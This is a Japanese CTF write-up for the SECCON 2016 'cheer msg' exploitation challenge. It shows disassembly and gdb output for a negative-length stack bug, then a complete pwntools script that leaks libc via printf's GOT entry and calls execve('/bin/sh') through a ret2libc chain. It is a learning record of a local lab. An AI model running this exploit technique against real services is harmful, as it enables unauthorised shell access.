# cheer msg [100pt] (SECCON 2016 Exploitation)

出題者の方によると簡単な問題とのことだが、自分の実力だとまだまだ苦戦した。  
（というより出題者の方の模範解答を横目に見ながら理解した）  
[SECCON 2016 Online Exploit作問 1/2 ](http://shift-crops.hatenablog.com/entry/2016/12/11/155902)

## 問題文
cheer_msg
Host : cheermsg.pwn.seccon.jp
Port : 30527

libc-2.19.so (SHA1 : c4dc1270c1449536ab2efbbe7053231f1a776368)
cheer_msg(SHA1 : a89bdbaf3a918b589e14446f88d51b2c63cb219f)

## 問題環境再現
出題時のサーバにはアクセスできないため、自前環境で問題を動かす必要がある。  
問題文でlibcが提供されているが、自前の環境ではセグフォが発生してしまったため使用していない。  
サーバ立ち上げ  
````
socat TCP-LISTEN:30527,reuseaddr,fork EXEC:cheer_msg
````

## 回答
バイナリ調査
````
$ file cheer_msg
cheer_msg: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed63cb3a04480eeb344d7d567c893805a1119f2f, not stripped
$ checksec.sh --file cheer_msg
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   cheer_msg
````
- 32bitバイナリ  
- Partial RELRO -> GOT Overwrite可能
- Canary found  -> 単純なStack BOFは難しい

mainの逆アセンブリ結果
````
   0x080485ca <+0>:	lea    ecx,[esp+0x4]
   0x080485ce <+4>:	and    esp,0xfffffff0
   0x080485d1 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080485d4 <+10>:	push   ebp
   0x080485d5 <+11>:	mov    ebp,esp
   0x080485d7 <+13>:	push   ecx
   0x080485d8 <+14>:	sub    esp,0x24
   0x080485db <+17>:	mov    DWORD PTR [esp],0x80487e0
   0x080485e2 <+24>:	call   0x8048430 <printf@plt>
   0x080485e7 <+29>:	call   0x804870d <getint>
   0x080485ec <+34>:	mov    DWORD PTR [ebp-0x10],eax
   0x080485ef <+37>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485f2 <+40>:	lea    edx,[eax+0xf]
   0x080485f5 <+43>:	mov    eax,0x10
   0x080485fa <+48>:	sub    eax,0x1
   0x080485fd <+51>:	add    eax,edx
   0x080485ff <+53>:	mov    ecx,0x10
   0x08048604 <+58>:	mov    edx,0x0
   0x08048609 <+63>:	div    ecx
   0x0804860b <+65>:	imul   eax,eax,0x10
   0x0804860e <+68>:	sub    esp,eax
   0x08048610 <+70>:	lea    eax,[esp+0x8]
   0x08048614 <+74>:	add    eax,0xf
   0x08048617 <+77>:	shr    eax,0x4
   0x0804861a <+80>:	shl    eax,0x4
   0x0804861d <+83>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048620 <+86>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048623 <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048627 <+93>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804862a <+96>:	mov    DWORD PTR [esp],eax
   0x0804862d <+99>:	call   0x804863c <message>
   0x08048632 <+104>:	leave  
   0x08048633 <+105>:	ret
````
getint()でメッセージ長を読み取り、その値に応じてmain+68でespの減じている。  
しかし、メッセージ長が負数だった場合のチェックが入っておらず、負の場合はespが増加し、mainのリターンアドレスの上書きが可能となる。  
適当に値を入れて試すと、メッセージ長が-144の場合にぴったりリターンアドレス上に入力を移すことができることがわかる。  
以下、gdbの出力結果
````
gdb-peda$ run
Hello, I'm Nao.
Give me your cheering messages :)

Message Length >> -144
Message >> 
Oops! I forgot to ask your name...
Can you tell me your name?

Name >> AAAA

Thank you AAAA!
Message : 

Program received signal SIGSEGV, Segmentation fault.

gdb-peda$ reg
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fb5870 --> 0x0 
ESI: 0xf7fb4000 --> 0x1afdb0 
EDI: 0xf7fb4000 --> 0x1afdb0 
EBP: 0x0 
ESP: 0xffffce70 --> 0xf7fb0000 --> 0x8a6 
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
````
eipが上書きできている。  
これで攻撃可能な脆弱性が判明したため、以下のような方針で攻撃する。  
1. ROPによりprintfでlibcの関数のアドレスをリーク
1. eipをmain()の先頭へ移す
1. リークしたアドレスからevecve()関数,'/bin/sh'へのアドレスを計算
1. 同じ脆弱性をもう一度利用し、evecve('bin/sh')を実行

## Script
````python
# -*- coding:utf-8 -*-
from pwn import *

context(os='linux', arch='i386')
conn = remote("localhost", 30527)

prob = ELF('./cheer_msg')
libc = ELF('/lib32/libc.so.6')

conn.recvuntil('Message Length >> ')
conn.sendline('-144')
conn.recvuntil('Name >> ')

plt_printf = prob.plt['printf']
got_printf = prob.got['printf']
addr_main = prob.symbols['main']
buf = pack(plt_printf) + pack(addr_main) + pack(got_printf)
conn.sendline(buf)
conn.recvuntil('Message : \n')
libc_printf = unpack(conn.read(4))

offset_printf = libc.symbols['printf']
offset_execve = libc.symbols['execve']
offset_binsh = next(libc.search('/bin/sh'))
libc_base = libc_printf - offset_printf
libc_execve = libc_base + offset_execve
libc_binsh = libc_base + offset_binsh

conn.recvuntil('Message Length >> ')
conn.sendline('-144')
conn.recvuntil('Name >> ')
buf = pack(libc_execve) + pack(0xdeadbeef) + pack(libc_binsh) + pack(0) + pack(0)
conn.sendline(buf)

conn.interactive()
````
以上  
改めてpwntools便利だと思った。

